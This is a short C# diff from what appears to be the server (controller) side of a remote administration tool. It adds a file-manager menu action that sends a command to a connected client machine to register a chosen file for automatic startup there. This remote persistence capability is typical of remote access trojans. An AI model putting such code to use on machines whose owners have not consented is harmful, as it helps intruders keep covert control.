@@ -208,6 +208,30 @@ namespace xServer.Forms
             }
         }
 
+        private void ctxtAddToAutostart_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem files in lstDirectory.SelectedItems)
+            {
+                if (files.Tag.ToString() == "file")
+                {
+                    string path = _currentDir;
+                    if (path.EndsWith(@"\"))
+                        path = path + files.SubItems[0].Text;
+                    else
+                        path = path + @"\" + files.SubItems[0].Text;
+
+                    using (var frm = new FrmAddToAutostart(path))
+                    {
+                        if (frm.ShowDialog() == DialogResult.OK)
+                        {
+                            if (_connectClient != null)
+                                new Core.Packets.ServerPackets.AddStartupItem(AutostartItem.Name, AutostartItem.Path, AutostartItem.Type).Execute(_connectClient);
+                        }
+                    }
+                }
+            }
+        }
+
         private void ctxtRefresh_Click(object sender, EventArgs e)
         {
             if (_connectClient != null)
